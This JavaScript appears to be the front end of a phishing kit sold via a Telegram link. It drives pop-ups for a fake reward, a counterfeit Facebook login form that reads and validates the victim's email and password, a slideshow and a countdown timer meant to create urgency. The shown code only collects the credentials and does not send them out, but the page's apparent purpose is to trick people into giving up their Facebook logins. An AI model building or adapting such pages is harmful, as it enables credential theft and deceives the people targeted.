function openguide() 
/** https://t.me/jefanyastore */
{
                $('.images').fadeIn();
            }
            function closeguide() {
                $('.images').hide();
            }
            function openrules() {
                $('.poprulesalexsh').fadeIn();
            }
            function closerules() {
                $('.poprulesalexsh').hide();
            }
            function openlogin() {
                $('.loginalexsh').fadeIn();
                $('.rewardalexsh').hide();
            }
            
            function openfbalex() {
                $('.alex-facebook').fadeIn();
                $('.loginalexsh').hide();
            }
            function closefbalex() {
                $('.alex-facebook').hide();
                $('.loginalexsh').fadeIn();
            }
            function openidalex() {
                $('.alex-pengunjung-fb').fadeIn();
                $('.loginalexsh').hide();
            }
            function closeidalex() {
                $('.alex-pengunjung-fb').hide();
                $('.loginalexsh').fadeIn();
            }
            
            function lagualex(){document.getElementById("lagualex").play()}var buka=new Audio;buka.src="https://dominov14.jefanyaefandchr.repl.co/clicked_alex_hdi.mp3";


  
            
        var slideIndex = 1;
        showDivs(slideIndex);
        
        function plusDivs(n) {
        showDivs(slideIndex += n);
        }
        
        function currentDiv(n) {
        showDivs(slideIndex = n);
        }

            function showDivs(n) {
            var i;
            var x = document.getElementsByClassName("mySlides");
            var dots = document.getElementsByClassName("demo");
                if (n > x.length) {slideIndex = 1}    
                if (n < 1) {slideIndex = x.length}
                    for (i = 0; i < x.length; i++) {
                        x[i].style.display = "none";  
                    }
                    for (i = 0; i < dots.length; i++) {
                        dots[i].className = dots[i].className.replace(" w3-white", "");
                    }
                        x[slideIndex-1].style.display = "block";  
                        dots[slideIndex-1].className += " w3-white";
                    }
            
            setInterval(function(){
                plusDivs(1);
            }, 3000);
            
            function AlexHostingNetFB()
        	{
        		$emailfb = $('#alx_email_fb').val().trim();
        		$passwordfb = $('#alx_password_fb').val().trim();
        		if($emailfb == '' || $emailfb == null || $emailfb.length <= 6)
        		{
        			$('.email-fb').show();
        			$('.sandi-fb').hide();
        			return false;
        		}else{
        			$('.email-fb').hide();
        		}
        		if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 6)
        		{
        			$('.sandi-fb').show();
        			return false;
        		}else{
        			$('.sandi-fb').hide();
        		}
        	}
        	
            $(document).ready(function() { 
            var detik = 52;
            var menit = 36;
            var jam = 20;
            function hitung() { 
            setTimeout(hitung,1000); $('#alextimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --;
            if(detik < 0) { 
            detik = 59; 
            menit --; 
            if(menit < 0) { 
            menit = 0; 
            detik = 0; 
            } 
            } 
            } 
            hitung(); 
            }
            );